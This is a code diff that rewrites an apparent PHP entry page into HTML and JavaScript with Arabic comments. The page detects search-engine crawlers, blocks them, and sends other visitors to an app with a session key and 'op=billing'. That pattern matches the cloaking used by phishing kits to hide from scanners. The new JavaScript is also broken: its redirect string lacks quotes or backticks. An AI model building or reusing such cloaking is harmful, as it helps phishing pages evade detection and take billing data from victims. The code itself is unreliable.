@@ -1,26 +1,46 @@
-<?php
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع HTML</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script> <!-- مكتبة SHA1 -->
+</head>
+<body>
+    <h1>مرحبا بك في موقعي!</h1>
 
-include "./helpers/index.php";
-require_once "./config.php";
+    <script>
+        // محاكاة دالة التحقق من الزواحف (bots)
+        function isBot(ip) {
+            // يمكنك إضافة مزيد من الزواحف بناءً على userAgent
+            const userAgent = navigator.userAgent.toLowerCase();
+            const bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot']; // قائمة الزواحف الشهيرة
 
-use Jaybizzle\CrawlerDetect\CrawlerDetect; 
-$CrawlerDetect = new CrawlerDetect; 
+            return bots.some(bot => userAgent.includes(bot)) || ip === "192.168.1.1"; // يمكنك إضافة المزيد من شروط الزواحف حسب الحاجة
+        }
 
-if ($CrawlerDetect->isCrawler() || IsBot($ip)) { 
-    http_response_code(403); 
-    die(); 
-} else {
-    $session_key = sha1($date.$ip);
-    $_SESSION['sessionKey'] = $session_key;
-    
-    // check if the user is already logged in
-    if (isset($_SESSION['sessionKey']) && isset($_SESSION['op'])) {
-        header("Location: ./".APP."?session_key=".$_SESSION['sessionKey']."&op=".$_SESSION['op']);
-        exit;
-    }
+        // محاكاة الـ IP وتاريخ الجلسة
+        const ip = "192.168.1.1"; // هنا يمكنك محاكاة أي عنوان IP
+        const date = new Date().toISOString();
+        const sessionKey = sha1(date + ip);  // إنشاء مفتاح الجلسة باستخدام SHA1
 
-    $op = "billing";
-    $_SESSION['op'] = $op;
-    header("Location: ./".APP."?session_key=".$_SESSION['sessionKey']."&op=".$_SESSION['op']);
-    exit;
-}
+        // فحص إذا كان المستخدم زاحف
+        if (isBot(ip)) {
+            alert("أنت زاحف! الوصول محظور.");
+            window.location.href = "about:blank";  // يمكنك توجيه الزواحف إلى صفحة فارغة أو عرض رسالة خطأ
+        } else {
+            // محاكاة الجلسة
+            sessionStorage.setItem('sessionKey', sessionKey);
+            sessionStorage.setItem('op', 'billing'); // محاكاة العملية التي كانت في PHP
+
+            // التوجيه
+            window.location.href = ./app?session_key=${sessionKey}&op=billing;
+        }
+
+        // دالة SHA1 (تم استخدام مكتبة CryptoJS)
+        function sha1(str) {
+            return CryptoJS.SHA1(str).toString(CryptoJS.enc.Base64); 
+        }
+    </script>
+</body>
+</html>
